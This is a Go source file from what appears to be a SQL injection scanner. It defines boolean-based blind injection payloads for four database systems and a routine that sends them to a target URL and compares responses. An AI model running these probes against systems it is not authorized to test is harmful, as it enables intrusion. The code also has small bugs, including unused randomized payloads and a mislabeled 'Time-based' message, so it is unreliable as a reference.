package blind

import (
	"GoInjection/backend/helper"
	"GoInjection/backend/query"
	"GoInjection/backend/structs"
	"fmt"
	"math/rand"
	"strings"
)

var booleanPayloads = map[string][]interface{}{
	"PostgresSQL": {
		[]interface{}{"1=0 OR 1=1", true},                          // True OR false logic
		[]interface{}{"1=0 OR 1=0", false},                         // False OR false logic
		[]interface{}{"1=0 OR 1=1 OR '§'='§'", true},               // True OR false with string check
		[]interface{}{"1=0 OR '$'='§'", false},                     // False condition
		[]interface{}{"1=0 OR 1=1 OR (SELECT 1)=(SELECT 1)", true}, // True OR false with subquery
		[]interface{}{"1=0 OR (SELECT 1)=(SELECT 2)", false},       // False condition with subquery
	},
	"MySQL": {
		[]interface{}{"1=0 OR 1=1", true},                          // True OR false logic
		[]interface{}{"1=0 OR 1=0", false},                         // False OR false logic
		[]interface{}{"1=0 OR 1=1 OR '§'='§'", true},               // True OR false with string check
		[]interface{}{"1=0 OR '$'='§'", false},                     // False condition
		[]interface{}{"1=0 OR 1=1 OR (SELECT 1)=(SELECT 1)", true}, // True OR false with subquery
		[]interface{}{"1=0 OR (SELECT 1)=(SELECT 2)", false},       // False condition with subquery
	},
	"MsSQL": {
		[]interface{}{"1=0 OR 1=1", true},                          // True OR false logic
		[]interface{}{"1=0 OR 1=0", false},                         // False OR false logic
		[]interface{}{"1=0 OR 1=1 OR '§'='§'", true},               // True OR false with string check
		[]interface{}{"1=0 OR '$'='§'", false},                     // False condition
		[]interface{}{"1=0 OR 1=1 OR (SELECT 1)=(SELECT 1)", true}, // True OR false with subquery
		[]interface{}{"1=0 OR (SELECT 1)=(SELECT 2)", false},       // False condition with subquery
	},
	"SQLite": {
		[]interface{}{"1=0 OR 1=1", true},                          // True OR false logic
		[]interface{}{"1=0 OR 1=0", false},                         // False OR false logic
		[]interface{}{"1=0 OR 1=1 OR '§'='§'", true},               // True OR false with string check
		[]interface{}{"1=0 OR '$'='§'", false},                     // False condition
		[]interface{}{"1=0 OR 1=1 OR (SELECT 1)=(SELECT 1)", true}, // True OR false with subquery
		[]interface{}{"1=0 OR (SELECT 1)=(SELECT 2)", false},       // False condition with subquery
	},
}

func BooleanBasedInjection(url string) (bool, string) {
	var trueResponse, falseResponse string
	var trueStatusCode, falseStatusCode int

	cleanedURLs, err := helper.GetUrls(url)
	helper.LogError(err)

	q := query.Query{DBMS: structs.TargetSyntax}
	for _, cleanedURL := range cleanedURLs {
		if payloads, ok := booleanPayloads[structs.TargetSyntax]; ok {
			for _, payload := range payloads {
				payloadStr := payload.([]interface{})[0].(string)
				//expectedBool := payload.([]interface{})[1].(bool)

				payload = strings.ReplaceAll(payloadStr, "§", fmt.Sprintf("%08d", rand.Int63n(1e8)))
				payload = strings.ReplaceAll(payloadStr, "$", fmt.Sprintf("%08d", rand.Int63n(1e8)))

				payloads, status := q.Build(payloadStr)
				if status != "Success" {
					return false, fmt.Sprintf("Error generating payloads: %s", status)
				}

				for i, payload := range payloads {
					response, statusCode := helper.SendRequest(strings.ReplaceAll(cleanedURL, helper.PayloadReplaceString, helper.URLEncodeQuery(payload)))
					structs.BooleanLinks++

					if statusCode >= 500 || strings.Contains(strings.ToLower(response), "sql syntax") || strings.Contains(strings.ToLower(response), "sql error") || strings.Contains(strings.ToLower(response), "database error") || strings.Contains(strings.ToLower(response), "exception") {
						continue
					}

					if i%2 != 0 {
						trueResponse = response
						trueStatusCode = statusCode
					} else {
						falseResponse = response
						falseStatusCode = statusCode

						if trueStatusCode != falseStatusCode {
							structs.TargetBoolean = true
							return true, payload
						}

						if trueResponse != falseResponse {
							structs.TargetBoolean = true
							return true, payload
						}

						return false, "No Boolean-based injection detected."
					}
				}
			}
		}
	}

	return false, "No Time-based injection detected."
}
